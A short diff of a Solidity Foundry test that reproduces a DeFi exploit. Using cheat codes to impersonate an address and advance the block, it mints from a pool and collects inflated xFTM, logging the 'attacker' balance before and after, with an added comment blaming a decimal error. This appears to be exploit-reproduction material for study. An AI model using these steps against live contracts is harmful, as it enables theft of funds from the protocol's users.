@@ -21,8 +21,8 @@ contract ContractTest is DSTest {
         cheat.prank(0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400);
         fsm.transfer(address(this), 100000000000000000000);
         emit log_named_uint("Before exploit, xFTM  balance of attacker:", xFTM.balanceOf(address(this)));
-        fsm.approve(0x880672AB1d46D987E5d663Fc7476CD8df3C9f937, type(uint256).max);
-        pool.mint(100000000000000000000,1);
+        fsm.approve(address(pool), type(uint256).max);
+        pool.mint(100000000000000000000,1); // Due to the decimal error, the _xftmOut is bigger than it is supposed to be.
         cheat.roll(32971743);
         pool.collect();
         emit log_named_uint("After exploit, xFTM  balance of attacker:", xFTM.balanceOf(address(this)));
